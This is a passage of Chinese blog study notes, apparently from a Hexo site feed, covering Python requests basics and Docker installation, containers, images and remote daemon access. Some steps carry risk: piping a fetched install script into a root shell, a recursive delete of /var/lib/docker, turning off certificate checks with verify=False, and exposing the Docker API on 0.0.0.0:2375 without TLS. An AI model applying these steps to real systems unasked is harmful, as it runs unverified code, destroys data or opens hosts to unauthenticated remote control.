urlencodeparams = {    &#39;name&#39;: &#39;qwzf&#39;,    &#39;age&#39;: 20}base_url = &#39;http://www.baidu.com?&#39;url = base_url + urlencode(params)print(url)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218220836104.jpg" alt="在这里插入图片描述"></p><h4 id="2-1-requests"><a href="#2-1-requests" class="headerlink" title="2.1 requests"></a>2.1 requests</h4><p>基于urllib，采用Apache2 Licensed开源协议的HTTP库。<br>简单来说，requests是Python实现的简单易用的HTTP库。<br><strong>2.1.1 安装</strong></p><pre><code class="python">pip3:pip3 install requestspip:pip install requests#指定python版本安装：python3 -m pip install requests</code></pre><h4 id="2-2-requests基础操作"><a href="#2-2-requests基础操作" class="headerlink" title="2.2 requests基础操作"></a>2.2 requests基础操作</h4><h5 id="2-2-1-各种请求方式"><a href="#2-2-1-各种请求方式" class="headerlink" title="2.2.1 各种请求方式"></a>2.2.1 各种请求方式</h5><pre><code class="python">import requestsrequests.post(&#39;http://httpbin.org/post&#39;)requests.put(&#39;http://httpbin.org/put&#39;)requests.delete(&#39;http://httpbin.org/delete&#39;)requests.head(&#39;http://httpbin.org/get&#39;)requests.options(&#39;http://httpbin.org/get&#39;)</code></pre><h5 id="2-2-2-请求"><a href="#2-2-2-请求" class="headerlink" title="2.2.2 请求"></a>2.2.2 请求</h5><h6 id="2-2-2-1-基本GET请求"><a href="#2-2-2-1-基本GET请求" class="headerlink" title="2.2.2.1 基本GET请求"></a>2.2.2.1 基本GET请求</h6><p><strong>（1）基本写法</strong></p><pre><code class="python">import requestsresponse = requests.get(&#39;http://httpbin.org/get&#39;)print(response.text)</code></pre><p><strong>（2）带参数GET请求</strong></p><pre><code class="python">import requestsdata = {    &#39;name&#39;: &#39;qwzf&#39;,    &#39;age&#39;: 20}response = requests.get(&quot;http://httpbin.org/get&quot;, params=data)print(response.text)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218233651629.jpg" alt="在这里插入图片描述"><br><strong>（3）解析json</strong></p><pre><code class="python">import requestsimport jsonresponse = requests.get(&quot;http://httpbin.org/get&quot;)print(response.text)print(response.json())print(json.loads(response.text))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218234234841.jpg" alt="在这里插入图片描述"><br><strong>（4）获取二进制数据</strong></p><pre><code class="python">import requestsresponse = requests.get(&quot;https://github.com/favicon.ico&quot;)print(type(response.text), type(response.content))print(response.text)print(response.content) #获取二进制内容</code></pre><p><img src="http://img-blog.csdnimg.cn/20200218234601749.jpg" alt="在这里插入图片描述"><br>将二进制数据写入二进制文件(如：图片、视频)：</p><pre><code class="python">import requestsresponse = requests.get(&quot;https://github.com/favicon.ico&quot;)with open(&#39;favicon.ico&#39;, &#39;wb&#39;) as f:    f.write(response.content)    f.close()</code></pre><p><strong>（5）添加headers</strong></p><pre><code class="python">import requestsheaders = {    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#39;}response = requests.get(&quot;https://www.zhihu.com/explore&quot;, headers=headers)print(response.text)</code></pre><h6 id="2-2-2-2-基本POST请求"><a href="#2-2-2-2-基本POST请求" class="headerlink" title="2.2.2.2 基本POST请求"></a>2.2.2.2 基本POST请求</h6><p><strong>（1）带参数POST请求</strong></p><pre><code class="python">import requestsdata = {&#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: &#39;20&#39;}response = requests.post(&quot;http://httpbin.org/post&quot;, data=data)print(response.text)</code></pre><p><strong>（2）带参数、添加headers和解析json的POST请求</strong></p><pre><code class="python">import requestsdata = {&#39;name&#39;: &#39;qwzf&#39;, &#39;age&#39;: &#39;20&#39;}headers = {    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#39;}response = requests.post(&quot;http://httpbin.org/post&quot;, data=data, headers=headers)print(response.json())</code></pre><h5 id="2-2-3-响应"><a href="#2-2-3-响应" class="headerlink" title="2.2.3 响应"></a>2.2.3 响应</h5><h6 id="2-2-3-1-reponse属性"><a href="#2-2-3-1-reponse属性" class="headerlink" title="2.2.3.1 reponse属性"></a>2.2.3.1 reponse属性</h6><pre><code class="python">import requestsresponse = requests.get(&#39;http://www.jianshu.com&#39;)print(type(response.status_code), response.status_code) #状态码print(type(response.headers), response.headers) #响应头print(type(response.cookies), response.cookies) #Cookieprint(type(response.url), response.url) #urlprint(type(response.history), response.history) #访问的历史记录</code></pre><h6 id="2-2-3-2-状态码判断"><a href="#2-2-3-2-状态码判断" class="headerlink" title="2.2.3.2 状态码判断"></a>2.2.3.2 状态码判断</h6><pre><code class="python">#判断Not Foundimport requestsresponse = requests.get(&#39;http://www.aliyun.com/qwzf.html&#39;)if response.status_code == requests.codes.not_found:    print(&#39;404 Not Found&#39;)#判断Successfullyimport requestsresponse = requests.get(&#39;http://www.aliyun.com&#39;)if response.status_code == 200:    print(&#39;Request Successfully&#39;)</code></pre><h4 id="2-3-requests高级操作"><a href="#2-3-requests高级操作" class="headerlink" title="2.3 requests高级操作"></a>2.3 requests高级操作</h4><p><strong>2.3.1 文件上传</strong></p><pre><code class="python">import requestsfiles = {&#39;file&#39;: open(&#39;favicon.ico&#39;, &#39;rb&#39;)}response = requests.post(&quot;http://httpbin.org/post&quot;, files=files)print(response.text)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219001321841.jpg" alt="在这里插入图片描述"><br><strong>2.3.2 获取cookie</strong></p><pre><code class="python">import requestsresponse = requests.get(&quot;http://www.baidu.com&quot;)print(response.cookies)for key, value in response.cookies.items():    print(key + &#39;=&#39; + value)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219001422156.jpg" alt="在这里插入图片描述"><br><strong>2.3.3 会话维持</strong><br><em>模拟登陆</em></p><pre><code class="python">import requestsrequests.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)response = requests.get(&#39;http://httpbin.org/cookies&#39;)print(response.text)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219224354305.jpg" alt="在这里插入图片描述"><br>实现在同一个浏览器实现setcookie和getcookie：</p><pre><code class="python">import requestss = requests.Session() #维持会话信息，使用Session对象发起两次请求s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)response = s.get(&#39;http://httpbin.org/cookies&#39;)print(response.text)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219224708469.jpg" alt="在这里插入图片描述"><br><strong>2.3.4 证书验证</strong><br>用于https解析url中的证书问题</p><pre><code class="python">import requestsresponse = requests.get(&#39;https://www.12306.cn&#39;) #https://www.12306.cn证书又正常了，暂时没找到证书失效的网站进行验证print(response.status_code)</code></pre><p>如果证书失效，使用下面代码，会返回状态码：</p><pre><code class="python">import requestsfrom requests.packages import urllib3urllib3.disable_warnings() #消除警告信息response = requests.get(&#39;https://www.12306.cn&#39;, verify=False)print(response.status_code)</code></pre><p>手动指定证书：</p><pre><code class="python">import requestsresponse = requests.get(&#39;https://www.12306.cn&#39;, cert=(&#39;/path/server.crt&#39;, &#39;/path/key&#39;))print(response.status_code)</code></pre><p><strong>2.3.5 代理设置</strong><br>系统代理开启，参考urllib代理设置。</p><pre><code class="python">import requestsproxies = {  &quot;http&quot;: &quot;http://127.0.0.1:10809&quot;,  &quot;https&quot;: &quot;https://127.0.0.1:10809&quot;,}&#39;&#39;&#39;proxies = {#如果代理有用户名和密码    &quot;http&quot;: &quot;http://user:password@127.0.0.1:10809/&quot;,    &quot;https&quot;: &quot;https://user:password@127.0.0.1:10809/&quot;,}&#39;&#39;&#39;response = requests.get(&quot;https://www.taobao.com&quot;, proxies=proxies)print(response.status_code)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219233145482.jpg" alt="在这里插入图片描述"><br>如果代理不是http和https代理，如socks代理：<br><code>pip3 install &#39;requests[socks]&#39;</code><br>设置开启socks代理，然后运行下面代码：</p><pre><code class="python">import requestsproxies = {    &#39;http&#39;: &#39;socks5://127.0.0.1:10809&#39;,    &#39;https&#39;: &#39;socks5://127.0.0.1:10809&#39;}response = requests.get(&quot;https://www.taobao.com&quot;, proxies=proxies)print(response.status_code)</code></pre><p><strong>2.3.6 超时设置</strong></p><pre><code class="python">import requestsfrom requests.exceptions import ReadTimeouttry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout=0.5)    print(response.status_code)except ReadTimeout:#捕获异常    print(&#39;Time out！&#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200219234029252.jpg" alt="在这里插入图片描述"><br><strong>2.3.7 认证设置</strong><br>登录验证</p><pre><code class="python">import requestsfrom requests.auth import HTTPBasicAuthr = requests.get(&#39;http://example.com/&#39;, auth=HTTPBasicAuth(&#39;qwzf&#39;, &#39;123&#39;))print(r.status_code)</code></pre><p>使用字典的方式：</p><pre><code class="python">import requestsr = requests.get(&#39;http://example.com/&#39;, auth=(&#39;user&#39;, &#39;123&#39;))print(r.status_code)</code></pre><p><strong>2.3.8 异常处理</strong><br>可以参考<a href="https://www.cnblogs.com/paulwinflo/p/11956668.html" target="_blank" rel="noopener">request.exceptions异常处理</a></p><pre><code class="python">import requestsfrom requests.exceptions import ReadTimeout, ConnectionError, RequestExceptiontry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5)    print(response.status_code)except ReadTimeout: #捕获超时异常    print(&#39;Timeout&#39;)except ConnectionError: #捕获连接异常    print(&#39;Connection error&#39;)except RequestException: #一个父类异常    print(&#39;Error&#39;)</code></pre><h3 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h3><p>本篇主要记录了爬虫的基本原理、urllib库和requests库的常见操作的学习与练习。Python网络爬虫学习持续更新中。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络爬虫 </tag>
            
            <tag> urllib库 </tag>
            
            <tag> requests库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记(一)-容器、镜像和客户端与守护进程</title>
      <link href="/2020/02/14/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)-%E5%AE%B9%E5%99%A8%E3%80%81%E9%95%9C%E5%83%8F%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/"/>
      <url>/2020/02/14/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)-%E5%AE%B9%E5%99%A8%E3%80%81%E9%95%9C%E5%83%8F%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>一直使用过docker，但并不是太了解，于是开始学习了解一下</p><h3 id="0x01-docker简介"><a href="#0x01-docker简介" class="headerlink" title="0x01 docker简介"></a>0x01 docker简介</h3><p><strong>1、什么是容器？</strong></p><ul><li>一种虚拟化的方案</li><li>操作系统级别的虚拟化</li><li>只能运行相同或相似内核的操作系统</li><li>依赖于Linux内核特性: Namespace和Cgroups (Control Group)</li></ul><p><strong>2、容器技术有哪些优点？</strong><br><img src="http://img-blog.csdnimg.cn/2020021322104357.png" alt="在这里插入图片描述"></p><ul><li>磁盘占用空间少</li><li>提供更多的服务能力和服务更多的用户</li></ul><p><strong>3、什么是Docker？</strong><br>Docker是能将应用程序自动部署到容器的开源引擎。<br>使用Go语言编写(Go语言开源引擎) <a href="https://github.com/docker/docker" target="_blank" rel="noopener">项目地址</a><br>基于Apache2.0开源授权协议发行</p><p><em>docker的特别之处：</em><br>docker在虚拟化的容器执行环境中增加了一个应用部署引擎。该引擎目标提供一个轻量、快速的环境。<br>方便从开发者环境-&gt;测试环境-&gt;生产环境<br><strong>4、Docker有哪些特点？(Docker的目标)</strong></p><ul><li>提供简单轻量的建模方式</li><li>职责的逻辑分离</li><li>快速高效的开发生命周期</li><li>鼓励使用面向服务的架构</li></ul><p><strong>5、Docker的使用场景</strong></p><ol><li>使用Docker容器开发、测试、部署服务</li><li>创建隔离的运行环境</li><li>搭建测试环境</li><li>构建多用户的平台即服务（PaaS）基础设施</li><li>提供软件即服务（SaaS）应用程序</li><li>高性能、超大规模的宿主机部署</li></ol><p><strong>6、Docker的基本组成</strong></p><blockquote><p>Docker Client 客户端<br>Docker Daemon 守护进程<br>Docker Image 镜像<br>Docker Container 容器<br>Docker Registry 仓库</p></blockquote><p>1.Docker客户端/守护进程：<br>（1）C/S架构<br>（2）本地/远程<br>2.Docker Image 镜像：<br>（1）容器的基石<br>（2）层叠的只读文件系统<br>（3）联合加载(union mount)<br><img src="http://img-blog.csdnimg.cn/20200213224154322.png" alt="在这里插入图片描述"><br>3.Docker Container 容器：<br>（1）通过镜像启动<br>（2）启动和执行阶段<br>启动时，在镜像的最顶层加载一个读写文件系统(可写层)<br>（3）写时复制<br>4.Docker Registry 仓库：<br>（1）公有：Docker Hub<br>（2）私有：可自己架设</p><h3 id="0x02-安装docker"><a href="#0x02-安装docker" class="headerlink" title="0x02 安装docker"></a>0x02 安装docker</h3><h4 id="1、验证是否安装curl"><a href="#1、验证是否安装curl" class="headerlink" title="1、验证是否安装curl"></a>1、验证是否安装curl</h4><p>验证是否安装了curl</p><pre><code class="shell">which curl</code></pre><p>如果没有安装则进行安装</p><pre><code class="shell">sudo apt-get updatesudo apt-get install curl</code></pre><h4 id="2、使用官方脚本自动安装docker"><a href="#2、使用官方脚本自动安装docker" class="headerlink" title="2、使用官方脚本自动安装docker"></a>2、使用官方脚本自动安装docker</h4><pre><code class="shell">curl -fsSL https://get.docker.com/ubuntu/|sudo sh或curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></pre><h4 id="3、通过版本库安装docker"><a href="#3、通过版本库安装docker" class="headerlink" title="3、通过版本库安装docker"></a>3、通过版本库安装docker</h4><p><strong>1.在Ubuntu中建立ce存储库</strong><br>（1）更新apt资源包</p><pre><code class="shell">sudo apt-get update</code></pre><p>（2）安装软件包以允许apt通过HTTPS使用存储库</p><pre><code class="shell">sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</code></pre><p>（3）添加Docker的官方GPG密钥</p><pre><code class="bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>可使用以下命令进行验证秘钥指纹 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88</p><pre><code class="shell">sudo apt-key fingerprint 0EBFCD88</code></pre><p>（4）可选设定稳定存储库，可不设置，则自动使用(deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> xenial stable)</p><pre><code class="shell">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu  xenial  stable&quot;</code></pre><p><strong>2.安装docker-ce并配置docker</strong><br>（1）更新apt资源包，并进行安装docker-ce</p><pre><code class="shell">sudo apt-get updatesudo apt-get -y install docker-ce</code></pre><p><em>注</em>：如果需要安装特定版本，则使用以下命令获取可用的版本号，使用要安装的版本号进行安装</p><pre><code class="shell">apt-cache madison docker-cesudo apt-get install -y docker-ce=&lt;VERSION&gt;例如：docker-ce=18.03.0~ce-0~ubuntu</code></pre><p>（2）基础安装完成，可以先进行测试一下是否可用</p><pre><code class="shell">sudo docker versionsudo docker run hello-world</code></pre><h4 id="4、配置与卸载docker"><a href="#4、配置与卸载docker" class="headerlink" title="4、配置与卸载docker"></a>4、配置与卸载docker</h4><p><strong>1.配置docker</strong><br>（1）省略sudo命令(感觉sudo麻烦的，可以执行这一步)<br>如果执行时不想使用sudo命令，可以进行设置用户组，并将当前用户增加到该组中</p><pre><code class="shell">sudo groupadd dockersudo usermod -aG docker $USER注销一下，再执行以下命令docker run hello-world</code></pre><p>（2）添加阿里云docker加速器和ip修改(不是必须的)</p><pre><code class="bash">{    &quot;registry-mirrors&quot;: [&quot;https://(yourid).mirror.aliyuncs.com&quot;],    &quot;bip&quot;:&quot;192.168.1.1/24&quot;}</code></pre><p><strong>2.卸载docker</strong><br>（1）卸载docker-ce</p><pre><code class="shell">sudo apt-get purge docker-ce</code></pre><p>（2）删除镜像、容器、卷</p><pre><code class="shell">sudo rm -rf /var/lib/docker</code></pre><h3 id="0x03-docker容器"><a href="#0x03-docker容器" class="headerlink" title="0x03 docker容器"></a>0x03 docker容器</h3><h4 id="1、容器的基本操作"><a href="#1、容器的基本操作" class="headerlink" title="1、容器的基本操作"></a>1、容器的基本操作</h4><p><strong>1.启动容器</strong></p><pre><code class="shell">docker run IMAGE [COMMAND][ARG..]#IMAGE启动容器所用镜像#COMMAND和ARG容器启动后运行的命令和参数如：输出Hello Worldroot@qwzf:~# docker run ubuntu echo &#39;Hello World&#39;Hello World</code></pre><p><strong>2.启动交互式容器</strong></p><pre><code class="shell">docker run -i -t IMAGE /bin/bash#-i 始终打开标准输入 --interactive=true|false 默认false#-t 为创建的容器分配一个伪tty终端 --tty=true|false 默认是false如：root@qwzf:~# docker run -i -t ubuntu /bin/bashroot@c12aa40c4376:/# </code></pre><p><strong>3.查看容器</strong></p><pre><code class="shell">docker ps [-a][-l]#没有参数时，列出正在运行的容器#-a 列出所有容器#-l 列出最新创建的容器查看已经建立起的容器docker inspect id/容器名</code></pre><p><strong>4.自定义容器名</strong></p><pre><code class="shell">docker run --name=自定义名 -i -t IMAGE /bin/bash</code></pre><p><strong>5.重新启动停止的容器</strong></p><pre><code class="shell">docker start [-i] id/容器名#-i可以以交互的方式来重新启动</code></pre><p><strong>6.删除停止的容器</strong></p><pre><code class="shell">docker rm id/容器名</code></pre><h4 id="2、守护式容器"><a href="#2、守护式容器" class="headerlink" title="2、守护式容器"></a>2、守护式容器</h4><p><strong>1.什么是守护式容器</strong></p><ul><li>长期运行</li><li>没有交互式会话</li><li>适合运行应用程序和服务</li></ul><p><strong>2.以守护形式运行容器</strong></p><pre><code class="bash">运行：docker run -i -t IMAGE /bin/bash退出交互式bash(这样容器就会在后台运行):Ctrl+P Ctrl+Q</code></pre><p><strong>3.附加到运行中的容器(再次进入容器)</strong></p><pre><code class="bash">docker attach id/容器名</code></pre><p><strong>4.启动守护式容器</strong></p><pre><code class="bash">docker run -d IMAGE [COMMAND][ARG..]#-d 启用容器时使用后台的方式执行命令</code></pre><p><strong>5.查看容器日志</strong></p><pre><code class="bash">docker logs [-f][-t][--tail] 容器名#-f 一直跟踪logs变化并返回结果 --folloes=true|false 默认false#-t 在返回的结果上加上时间戳 --timestamps=true|false 默认false#--tail 返回结尾处多少数量的日志 默认--tail=&quot;all&quot;如：显示最新的日志root@qwzf:~# docker logs -tf --tail 0 容器名</code></pre><p><strong>6.查看容器内进程</strong></p><pre><code class="bash">docker top 容器名</code></pre><p><strong>7.在运行中的容器内启动新进程</strong></p><pre><code class="bash">docker exec [-d][-i][-t] 容器名 [COMMAND][ARG..]如：docker exec -i -t c12aa40c4376 /bin/bash退出：Ctrl+P Ctrl+Q查看：docker top c12aa40c4376</code></pre><p><strong>8.停止守护式容器</strong></p><pre><code class="bash">docker stop 容器名#发送一个信号给容器，等待容器的停止docker kill 容器名#直接停止容器</code></pre><h3 id="0x04-docker镜像"><a href="#0x04-docker镜像" class="headerlink" title="0x04 docker镜像"></a>0x04 docker镜像</h3><p>存储位置：/var/lib/docker<br>查看存储驱动和存储位置：<code>docker info</code></p><h4 id="1、查看和删除镜像"><a href="#1、查看和删除镜像" class="headerlink" title="1、查看和删除镜像"></a>1、查看和删除镜像</h4><p><strong>1.列出镜像</strong></p><pre><code class="bash">docker images [选项] [REPOSITORY]#-a 显示所有镜像,默认不显示中间层镜像,--all=false #-f 显示时的过滤条件,--filter=[]#--no-trunc 不使用截断的方式显示数据#-q 只显示镜像的唯一d,--quiet=false</code></pre><p><img src="http://img-blog.csdnimg.cn/20200214001455701.jpg" alt="在这里插入图片描述"><br><strong>2.镜像标签和仓库</strong><br>（1）镜像的仓库 REPOSITORY<br>REPOSITORY 仓库：一系列镜像的集合<br>REGISTRY 仓库：docker镜像的存储服务<br>（2）镜像标签 TAG<br>不同镜像以标签进行区分<br>仓库名+标签名-&gt;镜像名 对应一个镜像的id</p><pre><code class="bash">ubuntu:14.04ubuntu:latest 默认</code></pre><p><strong>3.查看镜像</strong></p><pre><code class="bash">docker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]#-f,--format=&quot;&quot;如：docker inspet ubuntu:14.04</code></pre><p><strong>4.删除镜像</strong></p><pre><code class="bash">docker rmi [OPTIONS] IMAGE [IMAGE...]#-f 强制删除镜像#--no-prune 保留被打标签的父镜像如：删除单个：docker rmi 镜像id删除多个：docker ubuntu:12.04 ubuntu:14.04删除对应的所有镜像：docker rmi $(docker images -q ubuntu)</code></pre><h4 id="2、获取和推送镜像"><a href="#2、获取和推送镜像" class="headerlink" title="2、获取和推送镜像"></a>2、获取和推送镜像</h4><p><strong>1.查找镜像</strong><br>（1）<a href="https://registry.hub.docker.com" target="_blank" rel="noopener">Docker Hub</a><br>（2）<code>docker search [OPTIONS] TERM</code></p><blockquote><p>–automated 自动化，只会显示自动化构建的镜像<br>–no-trunc 不使用截断的方式显示数据<br>-s,–stars=0 限制显示的最低星级</p></blockquote><pre><code class="bash">docker search -s 3 ubuntu</code></pre><p><strong>2.拉取镜像</strong></p><pre><code class="bash">docker pull [OPTIONS] NAME [:TAG]#-a 匹配并下载所有标记的镜像如：docker pull ubuntu:14.04</code></pre><p><strong>3.推送镜像</strong></p><pre><code class="bash">docker push NAME[:TAG]</code></pre><h4 id="3、构建镜像"><a href="#3、构建镜像" class="headerlink" title="3、构建镜像"></a>3、构建镜像</h4><ul><li>保存对容器的修改，并再次使用</li><li>自定义镜像的能力</li><li>以软件的形式打包并分发服务及其运行环境</li></ul><pre><code class="bash">docker commit 通过容器构建docker build 通过Dockerfile文件构建</code></pre><p><strong>1.使用commit构建镜像</strong></p><pre><code class="bash">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]#-a 指定镜像作者#-m 记录镜像构建信息#-p 不暂停正在运行的容器如：docker commit -a &#39;qwzf&#39; -m &#39;nginx&#39; 容器名 qwzf/test1(qwzf/test1 可以随便填)</code></pre><p><strong>2.使用Dockerfile构建镜像</strong><br>Dockerfile文件：包含一切命令的文本文件<br>（1）创建Dockerfile</p><pre><code class="shell">#First DockerfileFROM ubuntu:14.04MAINTAINER qwzf &quot;注册邮箱&quot;RUN apt-get updateRUN apt-get install -y nginxEXPOSE 80</code></pre><p>（2）适用<code>docker build</code> 命令</p><pre><code class="bash">docker build [OPTIONS] PATH |URL|-#--force-rm#--no-cache#--pull#-q#--rm=true#-t,tags=&quot;&quot; 指定构建出镜像的名字如：docker build -t=&#39;qwzf/test2&#39;</code></pre><p>每执行一步返回唯一id，即中间层镜像</p><h3 id="0x05-docker其他操作"><a href="#0x05-docker其他操作" class="headerlink" title="0x05 docker其他操作"></a>0x05 docker其他操作</h3><h4 id="1、docker客户端与守护进程"><a href="#1、docker客户端与守护进程" class="headerlink" title="1、docker客户端与守护进程"></a>1、docker客户端与守护进程</h4><p><img src="http://img-blog.csdnimg.cn/20200701224043290.png" alt="在这里插入图片描述"><br><strong>1.docker与守护进程的通信方式</strong><br>Remote API(某些情况下支持STDIN、STDOUT、STDERR)<br><img src="http://img-blog.csdnimg.cn/20200701225337778.png" alt="在这里插入图片描述"><br><strong>2.docker与守护进程的连接方式</strong><br>通过socket进行连接，docker提供的三种模式：</p><pre><code class="shell">unix:///var/run/docker.sock #默认tcp://host:portfd://socketfd</code></pre><p><img src="http://img-blog.csdnimg.cn/20200701224553178.png" alt="在这里插入图片描述"><br>使用docker命令行操作，就是在客户端进行操作的。<br><strong>3.查看是否运行docker守护进程</strong></p><pre><code class="sql">ps -ef | grep docker</code></pre><p><img src="http://img-blog.csdnimg.cn/20200701224933399.png" alt="在这里插入图片描述"><br><strong>4.测试Remote API</strong></p><pre><code class="shell">nc -U /var/run/docker.sock #连接socket#发出指令，查看Remote API的一个接口。执行产生docker通过Remote API返回的结果GET /info HTTP/1.0</code></pre><p><strong>5.使用service命令管理</strong></p><pre><code class="shell">service docker startservice docker stopservice docker restart</code></pre><p><strong>6.启动配置文件：docker1.12版本以前/etc/default/docker，现在是/etc/docker/daemon.json</strong><br><strong>7.docker的远程访问</strong><br>docker的远程访问：docker客户端和守护进程配置到不同的机器上<br>（1）准备：<br>1）两台安装docker的服务器<br>2）修改docker守护进程启动选项，区别服务器<br>docker1.12之后docker建议在<code>/etc/docker/daemon.json</code>文件中修改docker启动参数,而不再是<br>修改<code>vim /etc/default/docker</code>的DOCKER_OPTS参数</p><pre><code class="shell">vim /etc/docker/daemon.json{    &quot;registry-mirrors&quot;: [&quot;https://(阿里加速器id).mirror.aliyuncs.com&quot;],    &quot;labels&quot;: [&quot;name=docker_server_1&quot;]}重启dockerservice docker restart查看是否修改成功docker info</code></pre><p><img src="http://img-blog.csdnimg.cn/2020070202061447.png" alt="在这里插入图片描述"><br>参考：<a href="https://yq.aliyun.com/articles/581105" target="_blank" rel="noopener">使用本地的docker客户端连接远程docker的守护进程</a></p><pre><code class="shell">#1.12版之前#vim /etc/default/docker#服务端：DOCKER_OPTS=&quot;--label name=docker_server_1&quot;#客户端：DOCKER_OPTS=&quot;--label name=docker_server_2&quot;</code></pre><p>3）保证Client API和Server API版本一致<br>（2）修改服务器端配置<br>同理，docker1.12之后的修改配置<code>/etc/docker/daemon.json</code>文件即可</p><p>设置客户端与守护进程的连接方式为：<code>tcp://host:port</code></p><pre><code class="shell">vim /etc/docker/daemon.json{  &quot;registry-mirrors&quot;: [&quot;https://kf0vxqi6.mirror.aliyuncs.com&quot;],  &quot;labels&quot;: [&quot;name=docker_server_1&quot;],  &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;]}#1.12版本前#DOCKER_OPTS=&quot;--label name=docker_server_1 -H tcp://0.0.0.0:2375&quot;重启dockerservice docker restart查看是否运行docker守护进程ps -ef | grep docker</code></pre><p>测试服务器端docker客户端连接本机守护进程<br>本机直接docker info连接守护进程测试，会显示不支持本地连接(一般使用方法二解决)</p><pre><code class="shell">方法一：可使用配置环境变量或使用-H选项进行连接，参考下面客户端机器连接本机的守护进程的方式方法二：也可以在启动选项上添加默认连接方式unix:///var/run/docker.sockvim /etc/docker/daemon.json{  &quot;registry-mirrors&quot;: [&quot;https://kf0vxqi6.mirror.aliyuncs.com&quot;],  &quot;labels&quot;: [&quot;name=docker_server_1&quot;],  &quot;hosts&quot;: [        &quot;tcp://0.0.0.0:2375&quot;,        &quot;unix:///var/run/docker.sock&quot;    ]}#1.12版之前#DOCKER_OPTS=&quot;--label name=docker_server_1 -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock&quot;然后重启docker即可</code></pre><p>（3）在客户端操作与修改客户端配置<br>1）在客户端操作实现远程访问</p><pre><code class="shell">测试能否成功访问到curl http://192.168.201.128:2375/info实现客户端的远程访问docker -H tcp://192.168.201.128:2375 info</code></pre><p>2）修改客户端配置实现远程访问<br><strong>使用环境变量 DOCKER_HOST</strong>，不用重复<strong>使用-H选项</strong>实现远程访问</p><pre><code class="shell">export DOCKER_HOST=&quot;tcp://192.168.201.128:2375&quot;运行docker info命令测试调回连接本机的docker守护进程，只需将环境变量置空export DOCKER_HOST=&quot;&quot;#这样docker又会使用默认的连接方式：unix:///var/run/docker.sock</code></pre><p>具体实现过程可参考：<br><a href="https://yq.aliyun.com/articles/581105" target="_blank" rel="noopener">使用本地的docker客户端连接远程docker的守护进程</a><br><a href="https://www.iteye.com/blog/agilestyle-2354935" target="_blank" rel="noopener">Docker远程访问</a></p><h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p>暂时就先学这么多吧！本次学习Docker我学习了docker的安装、docker容器和docker镜像的一些操作，docker客户端与守护进程。总的来说，收获很大，继续努力！！！</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 容器 </tag>
            
            <tag> 镜像 </tag>
            
            <tag> 客户端与守护进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo速度优化及遇到的问题(gulp4、hexo-neat)</title>
      <link href="/2020/02/08/Hexo%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98(gulp4%E3%80%81hexo-neat)/"/>
      <url>/2020/02/08/Hexo%E9%80%9F%E5%BA%A6%E4%BC%98%E5%8C%96%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98(gulp4%E3%80%81hexo-neat)/</url>
      
